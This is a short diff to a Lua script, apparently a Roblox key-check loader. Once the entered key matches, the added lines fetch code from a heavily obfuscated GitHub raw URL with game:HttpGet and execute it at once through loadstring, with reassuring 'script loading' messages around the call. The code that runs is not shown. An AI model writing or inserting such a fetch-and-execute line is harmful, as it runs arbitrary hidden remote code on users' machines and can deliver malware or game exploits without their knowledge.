@@ -56,7 +56,9 @@ end)
     else
         if v == _G.Key then
             --Whitelisted!
-            print("Work")
+            print("Valid key, script loading...")
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/UD92IlIllllII421248535IlIIIIIIIlllIlIIl/E/main/QS2345%267pZmEyrQ8NQ%5E7%2617U1iDtQS%267pZmEyrQ8NQ%5E7%2617U1iDtQS%267pZmEyrQ8NQ%5E7%2617U1iDtQS%267pZmEyrQ8NQ%5E7%2617U1iDtIlllllllIlIIII.lllI.2324%23%5E%24%40%24%5E%25%40%23%24%26%5E%40%23%24%25%5E%40%23%24HAHAHHALMAOQS%267pZmEyrQ8NQ%5E7%2617U1iDt234897324.Lua"))()
+            print("Script loaded!")
             keyCheck = _G.Key
             keys = ""
         else
